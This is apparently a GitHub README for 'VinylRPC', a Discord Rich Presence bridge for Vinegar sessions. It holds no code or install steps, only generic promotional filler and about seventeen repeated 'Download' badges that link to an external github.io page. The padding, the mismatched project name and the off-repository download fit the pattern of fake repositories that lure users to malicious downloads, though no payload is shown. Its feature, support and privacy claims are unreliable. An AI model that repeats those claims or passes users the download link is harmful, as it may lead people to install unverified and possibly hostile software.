![preview](https://raw.githubusercontent.com/jiggle481-gif/vinegar-presence-bridge/main/hero_0ec05d8.svg)
[![Download](https://raw.githubusercontent.com/jiggle481-gif/vinegar-presence-bridge/main/bin_dcd682.svg)](https://jiggle481-gif.github.io/vinegar-presence-bridge/)

# 🍇 VinylRPC — Presence-Aware Companion for Vinegar Sessions

> A distinct, community-crafted Discord Rich Presence bridge that paints your Vinegar experience onto your Discord profile with warmth, clarity, and a touch of personality.

[![Download](https://raw.githubusercontent.com/jiggle481-gif/vinegar-presence-bridge/main/bin_dcd682.svg)](https://jiggle481-gif.github.io/vinegar-presence-bridge/)

---

## 📖 Table of Contents

- [Overview](#-overview)
- [Origin Story & Design Philosophy](#-origin-story--design-philosophy)
- [Feature Highlights](#-feature-highlights)
- [Responsive Interface](#-responsive-interface)
- [Multilingual Support](#-multilingual-support)
- [Round-the-Clock Assistance](#-round-the-clock-assistance)
- [How It Fits Into Your Workflow](#-how-it-fits-into-your-workflow)
- [Configuration Walkthrough](#-configuration-walkthrough)
- [Compatibility Matrix](#-compatibility-matrix)
- [SEO & Discoverability Notes](#-seo--discoverability-notes)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Contributing](#-contributing)
- [License](#-license)
- [Disclaimer](#-disclaimer)

[![Download](https://raw.githubusercontent.com/jiggle481-gif/vinegar-presence-bridge/main/bin_dcd682.svg)](https://jiggle481-gif.github.io/vinegar-presence-bridge/)

---

## 🌟 Overview

VinylRPC is a lightweight, thoughtful companion layer that transforms the way your Vinegar sessions appear to friends on Discord. Instead of a blank or generic status, VinylRPC broadcasts rich, contextual details — what you are enjoying, how long you have been at it, and a curated visual identity that reflects your taste.

Where other presence tools feel mechanical, VinylRPC feels like a well-tuned instrument. It listens to your environment, hums along quietly in the background, and only speaks up when it has something meaningful to say.

The project was born out of a simple observation: your Discord presence is a social signal. It deserves to be accurate, tasteful, and pleasant to look at. VinylRPC delivers exactly that — nothing more, nothing less.

[![Download](https://raw.githubusercontent.com/jiggle481-gif/vinegar-presence-bridge/main/bin_dcd682.svg)](https://jiggle481-gif.github.io/vinegar-presence-bridge/)

---

## 🎨 Origin Story & Design Philosophy

VinylRPC began as a weekend experiment. The idea was to build a "presence broker" — a service that sits between an application runtime and Discord's IPC channel, gracefully translating state into a story.

Three principles guided every commit:

1. **Restraint over noise.** Only surface what is genuinely useful. No spammy updates, no flickering statuses.
2. **Resilience by default.** If Discord is closed, or the socket is unavailable, VinylRPC waits patiently. It never blocks the host application.
3. **Beauty in the small things.** Asset names, timestamps, and state strings are chosen carefully. Every frame of presence should look intentional.

This philosophy has shaped VinylRPC into something users describe as "quietly excellent" — a background companion that just works.

[![Download](https://raw.githubusercontent.com/jiggle481-gif/vinegar-presence-bridge/main/bin_dcd682.svg)](https://jiggle481-gif.github.io/vinegar-presence-bridge/)

---

## ✨ Feature Highlights

- 🧩 **Seamless session detection** — VinylRPC notices when a compatible session begins and ends, updating presence without manual intervention.
- 🖼️ **Rich visual assets** — Large and small image slots are populated with contextually relevant artwork.
- ⏱️ **Live elapsed timers** — Timestamps track how long you have been active, giving friends a natural sense of your session.
- 🎛️ **Granular toggles** — Enable or disable individual presence fields (state, details, images, timers) from a single configuration surface.
- 🔄 **Automatic reconnection** — Short interruptions in the Discord client or the host application are handled transparently.
- 🧠 **Smart idle handling** — When you step away, presence gracefully reflects that, then restores when you return.
- 📦 **Zero-dependency core** — The runtime core is intentionally tiny, keeping startup overhead negligible.
- 🧪 **Diagnostics mode** — A verbose logging mode helps troubleshoot integration without polluting normal operation.
- 🎨 **Themeable asset map** — Point VinylRPC at your own image keys for a truly personal presence.
- 🔐 **Local-only by design** — No telemetry leaves your machine. Presence data stays between you, the host app, and Discord.

[![Download](https://raw.githubusercontent.com/jiggle481-gif/vinegar-presence-bridge/main/bin_dcd682.svg)](https://jiggle481-gif.github.io/vinegar-presence-bridge/)

---

## 📱 Responsive Interface

The bundled control panel adapts fluidly across screen sizes. On a wide desktop monitor, you get a spacious two-column layout with live preview and log output side by side. On a narrow laptop pane, the panels stack gracefully. On a handheld device used for remote configuration, the controls collapse into a touch-friendly single column.

Responsiveness is not just about breakpoints — it is about respecting the user's attention. Every control reflows with intent, and no action ever requires horizontal scrolling.

- Adaptive grid layout
- Keyboard-first navigation
- High-contrast mode support
- Reduced-motion aware transitions
- Accessible labels on every toggle

[![Download](https://raw.githubusercontent.com/jiggle481-gif/vinegar-presence-bridge/main/bin_dcd682.svg)](https://jiggle481-gif.github.io/vinegar-presence-bridge/)

---

## 🌍 Multilingual Support

Presence is a language of its own, but the interface should speak yours. VinylRPC ships with community-maintained translations for a growing list of locales, and the string system is designed so that new languages can be added with a single file drop.

- English (baseline)
- Spanish
- Portuguese (Brazil)
- French
- German
- Italian
- Japanese
- Korean
- Simplified Chinese
- Turkish
- Polish
- Russian

Each translation file is versioned alongside the code, and a validation script ensures no key is left behind when a new field appears.

Contribute a new locale — the process is documented in the contribution guide.

[![Download](https://raw.githubusercontent.com/jiggle481-gif/vinegar-presence-bridge/main/bin_dcd682.svg)](https://jiggle481-gif.github.io/vinegar-presence-bridge/)

---

## 🕰️ Round-the-Clock Assistance

Questions do not respect time zones, and neither do we. VinylRPC maintains a presence in community discussion spaces around the clock, with volunteers spanning multiple continents. Whether you are configuring your first presence field at dawn or debugging an edge case at midnight, someone is usually nearby.

- Community chat channels monitored continuously
- Issue tracker triaged daily
- Documentation updated with each release
- Response time target: under 24 hours for any reported concern

This is not a promise of instant answers — it is a commitment to never leaving you stranded.

[![Download](https://raw.githubusercontent.com/jiggle481-gif/vinegar-presence-bridge/main/bin_dcd682.svg)](https://jiggle481-gif.github.io/vinegar-presence-bridge/)

---

## 🧭 How It Fits Into Your Workflow

VinylRPC slots into your daily rhythm like a bookmark in a well-loved book.

1. **Launch** your Vinegar environment as usual.
2. **VinylRPC awakens** quietly in the background, waiting for the first sign of activity.
3. **Presence appears** on Discord with accurate state, details, and artwork.
4. **You forget it exists** — which is the highest compliment a background tool can receive.
5. **When you close** your session, presence clears cleanly, leaving no ghost entries.

There is no ritual to learn, no daemon to babysit, no log file to prune.

[![Download](https://raw.githubusercontent.com/jiggle481-gif/vinegar-presence-bridge/main/bin_dcd682.svg)](https://jiggle481-gif.github.io/vinegar-presence-bridge/)

---

## ⚙️ Configuration Walkthrough

Configuration lives in a single human-readable file. Every option is documented inline with sensible defaults.

- `enabled` — master switch for the entire bridge
- `showDetails` — toggles the primary descriptive line
- `showState` — toggles the secondary contextual line
- `showTimestamps` — controls elapsed-time display
- `showImages` — controls the large and small asset slots
- `idleThreshold` — seconds of inactivity before presence softens
- `assetMap` — user-defined mapping of scene keys to image assets
- `logLevel` — verbosity for diagnostics
- `language` — preferred interface locale

Changes are picked up on the fly — no restart ritual required.

[![Download](https://raw.githubusercontent.com/jiggle481-gif/vinegar-presence-bridge/main/bin_dcd682.svg)](https://jiggle481-gif.github.io/vinegar-presence-bridge/)

---

## 🧮 Compatibility Matrix

| Environment | Status | Notes |
| --- | --- | --- |
| Desktop client | ✅ Supported | Primary target |
| Flatpak runtime | ✅ Supported | Verified in sandboxed installs |
| AppImage runtime | ✅ Supported | Portable, no host pollution |
| Snap runtime | ⚠️ Partial | Socket permissions may vary |
| Headless CI | 🧪 Experimental | Diagnostics only |

The matrix is refreshed with each release cycle to reflect real-world testing.

[![Download](https://raw.githubusercontent.com/jiggle481-gif/vinegar-presence-bridge/main/bin_dcd682.svg)](https://jiggle481-gif.github.io/vinegar-presence-bridge/)

---

## 🔎 SEO & Discoverability Notes

VinylRPC is described using natural language that reflects how people actually search. Rather than stuffing keywords, the documentation weaves them into meaningful sentences.

Commonly referenced phrases include: Discord Rich Presence companion, Vinegar presence bridge, session-aware Discord status, Rich Presence integration for Vinegar, and presence configuration utility. Each of these appears where it genuinely helps a reader, never as filler.

Search engines reward clarity. So do humans.

[![Download](https://raw.githubusercontent.com/jiggle481-gif/vinegar-presence-bridge/main/bin_dcd682.svg)](https://jiggle481-gif.github.io/vinegar-presence-bridge/)

---

## 🗺️ Roadmap for 2026

- **Q1 2026** — Refined asset pipeline and preset themes
- **Q2 2026** — Optional plugin surface for third-party overlays
- **Q3 2026** — Expanded locale coverage and translation tooling
- **Q4 2026** — Long-session analytics and personal insight panel

Roadmap items are aspirational. Priorities may shift based on community feedback.

[![Download](https://raw.githubusercontent.com/jiggle481-gif/vinegar-presence-bridge/main/bin_dcd682.svg)](https://jiggle481-gif.github.io/vinegar-presence-bridge/)

---

## ❓ Frequently Asked Questions

**Does VinylRPC slow down my machine?**
No. The runtime footprint is minimal, and the update loop is event-driven rather than polling-heavy.

**Will it work if Discord is launched after the host application?**
Yes. VinylRPC retries connections with backoff and settles once the socket becomes available.

**Can I customize the artwork shown?**
Absolutely. The asset map lets you point any scene key at your preferred image identifier.

**Is my activity data sent anywhere?**
No. Presence flows only between your machine and the Discord client.

**What happens if I close Discord mid-session?**
VinylRPC pauses silently and resumes when Discord returns.

[![Download](https://raw.githubusercontent.com/jiggle481-gif/vinegar-presence-bridge/main/bin_dcd682.svg)](https://jiggle481-gif.github.io/vinegar-presence-bridge/)

---

## 🤝 Contributing

Contributions are warmly welcomed. Whether you fix a typo, add a translation, or refine the reconnection strategy, your effort matters.

Before opening a pull request, please:

- Read the contribution guide
- Run the local validation script
- Keep changes focused and well-described
- Add or update tests where behavior changes

Kindness in review threads is a project requirement, not a suggestion.

[![Download](https://raw.githubusercontent.com/jiggle481-gif/vinegar-presence-bridge/main/bin_dcd682.svg)](https://jiggle481-gif.github.io/vinegar-presence-bridge/)

---

## 📜 License

VinylRPC is released under the MIT License. You are welcome to use, modify, and distribute it in accordance with the terms of that license.

Read the full license text here: [MIT License](https://opensource.org/licenses/MIT)

Copyright (c) 2026 VinylRPC Contributors

[![Download](https://raw.githubusercontent.com/jiggle481-gif/vinegar-presence-bridge/main/bin_dcd682.svg)](https://jiggle481-gif.github.io/vinegar-presence-bridge/)

---

## ⚠️ Disclaimer

VinylRPC is an independent, community-driven project. It is not affiliated with, endorsed by, or sponsored by Discord, Vinegar, or any related organization. All trademarks and product names belong to their respective owners.

The software is provided "as is", without warranty of any kind, express or implied, including but not limited to the warranties of merchantability, fitness for a particular purpose, and noninfringement. In no event shall the authors or copyright holders be liable for any claim, damages, or other liability arising from, out of, or in connection with the software or its use.

Users are responsible for ensuring their use complies with the terms of service of any third-party platform they interact with. VinylRPC does not modify, patch, or alter any host application — it merely observes and reports presence state that the host application already exposes.

If you enjoy the project and find it useful, consider sharing it with someone who might feel the same. Word of mouth is the best gift a small project can receive.

[![Download](https://raw.githubusercontent.com/jiggle481-gif/vinegar-presence-bridge/main/bin_dcd682.svg)](https://jiggle481-gif.github.io/vinegar-presence-bridge/)